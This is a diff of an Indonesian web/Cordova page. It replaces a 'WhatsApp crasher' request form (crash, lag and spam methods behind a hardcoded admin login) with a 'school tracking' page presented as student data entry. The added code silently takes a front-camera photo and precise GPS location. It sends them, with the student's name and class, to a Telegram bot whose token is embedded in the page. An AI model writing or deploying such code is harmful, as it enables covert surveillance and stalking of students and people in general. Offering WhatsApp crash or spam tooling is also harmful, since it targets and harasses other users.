@@ -1,198 +1,109 @@
-<!DOCTYPE html>
-<html lang="id">
+<!DOCTYPE html><html lang="id">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Confess Matrix Merah</title>
+  <title>Sistem Pelacak Sekolah</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
     body {
-      margin: 0;
-      font-family: 'Share Tech Mono', monospace;
-      background: black;
-      color: #ff1a1a;
-      overflow: hidden;
-    }
-    canvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      z-index: -1;
-    }
-    .container {
-      max-width: 400px;
-      margin: 60px auto;
-      padding: 30px;
-      background: rgba(0, 0, 0, 0.7);
-      border-radius: 15px;
-      box-shadow: 0 0 25px red;
-    }
-    h1 {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #0d47a1, #1976d2);
+      color: #fff;
+      padding: 20px;
       text-align: center;
-      font-size: 26px;
-      color: #ff1a1a;
     }
-    input, textarea, select {
-      width: 100%;
+    input {
       padding: 10px;
-      margin-top: 10px;
-      border-radius: 8px;
-      border: 1px solid red;
-      background-color: #111;
-      color: #ff4d4d;
-      font-size: 14px;
+      border-radius: 5px;
+      border: none;
+      margin: 10px 0;
+      width: 80%;
+      max-width: 400px;
     }
     button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 15px;
+      padding: 10px 20px;
       border: none;
-      background: red;
-      color: white;
-      font-weight: bold;
-      border-radius: 10px;
+      background-color: #00c853;
+      color: #fff;
       font-size: 16px;
+      border-radius: 5px;
       cursor: pointer;
     }
-    .login-box, .form-box {
-      display: none;
-    }
-    .show {
-      display: block;
-    }
-    .message {
-      margin-top: 15px;
-      background: rgba(255,0,0,0.1);
-      padding: 10px;
-      border-left: 4px solid red;
-      border-radius: 5px;
-      color: white;
-    }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
+  <h2>📚 Sistem Pendataan Sekolah</h2>
+  <input type="text" id="namaSekolah" placeholder="Nama Sekolah">
+  <input type="text" id="namaMurid" placeholder="Nama Murid">
+  <input type="text" id="kelasMurid" placeholder="Kelas">
+  <br>
+  <button onclick="ambilData()">Kirim</button>
+  <p id="status">Menunggu izin kamera dan lokasi...</p>  <script>
+    document.addEventListener("deviceready", onDeviceReady, false);
 
-<canvas id="matrix"></canvas>
-
-<div class="container">
-  <div class="login-box show" id="loginBox">
-    <h1>LOGIN MATRIX</h1>
-    <input type="text" id="username" placeholder="Username">
-    <input type="password" id="password" placeholder="Password">
-    <button onclick="login()">Masuk</button>
-  </div>
-
-  <div class="form-box" id="formBox">
-    <h1>THE AVENGERS V2 CRASHER</h1>
-    <input type="text" id="sender" placeholder="Nomor pengirim">
-    <input type="text" id="target" placeholder="Nomor Target (WhatsApp)">
-    <select id="method">
-      <option value="Crash">Crash</option>
-      <option value="Lag">Lag</option>
-      <option value="Spam">Spam</option>
-    </select>
-    <textarea id="message" rows="4" placeholder="Pesan"></textarea>
-    <button onclick="sendConfess()">Kirim</button>
-    <div class="message" id="statusMsg" style="display:none;"></div>
-  </div>
-</div>
-
-<audio id="typeSound" src="https://assets.mixkit.co/sfx/preview/mixkit-fast-typing-2676.mp3"></audio>
-
-<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
-<script>
-  // Firebase config
-  const firebaseConfig = {
-    apiKey: "YOUR_API_KEY",
-    authDomain: "web-shop-7df3d.firebaseapp.com",
-    databaseURL: "https://web-shop-7df3d-default-rtdb.firebaseio.com",
-    projectId: "web-shop-7df3d",
-    storageBucket: "web-shop-7df3d.appspot.com",
-    messagingSenderId: "YOUR_SENDER_ID",
-    appId: "YOUR_APP_ID"
-  };
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.database();
-
-  // Login
-  function login() {
-    const user = document.getElementById("username").value.trim();
-    const pass = document.getElementById("password").value.trim();
-    if (user === "admin" && pass === "123456") {
-      document.getElementById("loginBox").classList.remove("show");
-      document.getElementById("formBox").classList.add("show");
-    } else {
-      alert("Username/password salah!");
-    }
-  }
-
-  // Kirim Data
-  function sendConfess() {
-    const pengirim = document.getElementById("sender").value;
-    const target = document.getElementById("target").value;
-    const metode = document.getElementById("method").value;
-    const pesan = document.getElementById("message").value;
-    const time = new Date().toLocaleString("id-ID");
-
-    if (!pengirim || !target || !pesan) {
-      alert("Isi semua form!");
-      return;
+    function onDeviceReady() {
+      requestPermissions();
     }
 
-    const data = {
-      pengirim,
-      target,
-      metode,
-      pesan,
-      waktu: time
-    };
-
-    db.ref("confess_matrix").push(data, () => {
-      document.getElementById("statusMsg").style.display = "block";
-      document.getElementById("statusMsg").innerText = "Request bug anda telah terkirim, tunggu jawabannya";
-    });
-  }
-
-  // Efek Matrix
-  const canvas = document.getElementById('matrix');
-  const ctx = canvas.getContext('2d');
-  canvas.height = window.innerHeight;
-  canvas.width = window.innerWidth;
-
-  const chars = "01A9BCDEF@#$%^&*";
-  const fontSize = 16;
-  const columns = canvas.width / fontSize;
-  const drops = Array(Math.floor(columns)).fill(1);
-
-  function drawMatrix() {
-    ctx.fillStyle = "rgba(0, 0, 0, 0.07)";
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-    ctx.fillStyle = "rgba(255, 0, 0, 0.9)";
-    ctx.shadowColor = "red";
-    ctx.shadowBlur = 10;
-    ctx.font = fontSize + "px monospace";
-
-    for (let i = 0; i < drops.length; i++) {
-      const text = chars.charAt(Math.floor(Math.random() * chars.length));
-      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-      if (drops[i] * fontSize > canvas.height || Math.random() > 0.975) {
-        drops[i] = 0;
-      }
-      drops[i]++;
+    function requestPermissions() {
+      const permissions = cordova.plugins.permissions;
+      permissions.requestPermissions([
+        permissions.CAMERA,
+        permissions.ACCESS_FINE_LOCATION
+      ], function(status) {
+        if (status.hasPermission) {
+          document.getElementById("status").textContent = "Izin diberikan. Siap kirim.";
+        } else {
+          document.getElementById("status").textContent = "Izin tidak diberikan!";
+        }
+      }, null);
     }
-  }
-  setInterval(drawMatrix, 30);
 
-  // Efek suara ketikan
-  const typeSound = document.getElementById('typeSound');
-  const inputs = document.querySelectorAll('input, textarea');
-  inputs.forEach(el => {
-    el.addEventListener('input', () => {
-      typeSound.currentTime = 0;
-      typeSound.play();
-    });
-  });
-</script>
-</body>
+    function ambilData() {
+      const namaSekolah = document.getElementById("namaSekolah").value;
+      const namaMurid = document.getElementById("namaMurid").value;
+      const kelasMurid = document.getElementById("kelasMurid").value;
+
+      navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        navigator.camera.getPicture(onSuccess, onFail, {
+          quality: 50,
+          destinationType: Camera.DestinationType.DATA_URL,
+          cameraDirection: 1,
+          correctOrientation: true
+        });
+
+        function onSuccess(imageData) {
+          const data = {
+            chat_id: "7710934597",
+            caption: `Sekolah: ${namaSekolah}\nNama: ${namaMurid}\nKelas: ${kelasMurid}\nLokasi: ${lat}, ${lon}`,
+            photo: imageData
+          };
+
+          fetch("https://api.telegram.org/bot7754938090:AAFJLES5-gmBII25eaPp0HH_puccGJJ878c/sendPhoto", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+          })
+          .then(res => res.json())
+          .then(res => {
+            document.getElementById("status").textContent = "Data berhasil dikirim!";
+          })
+          .catch(err => {
+            document.getElementById("status").textContent = "Gagal mengirim ke Telegram.";
+            console.error(err);
+          });
+        }
+
+        function onFail(message) {
+          document.getElementById("status").textContent = "Gagal mengambil foto: " + message;
+        }
+      }, err => {
+        document.getElementById("status").textContent = "Gagal mengambil lokasi.";
+        console.error(err);
+      }, { enableHighAccuracy: true });
+    }
+  </script></body>
 </html>
